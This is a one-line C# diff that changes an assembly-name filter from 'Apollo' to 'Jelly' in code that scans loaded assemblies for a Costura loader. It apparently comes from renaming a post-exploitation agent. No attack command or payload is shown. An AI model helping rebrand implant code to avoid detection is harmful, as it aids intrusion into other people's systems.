@@ -410,7 +410,7 @@ namespace Tasks
             Console.SetError((StringWriter)writer);
             foreach (var asm in AppDomain.CurrentDomain.GetAssemblies())
             {
-                if (!asm.FullName.Contains("mscorlib") && !asm.FullName.Contains("Apollo"))
+                if (!asm.FullName.Contains("mscorlib") && !asm.FullName.Contains("Jelly"))
                 {
                     var costuraLoader = asm.GetType("Costura.AssemblyLoader", false);
                     if (costuraLoader != null)
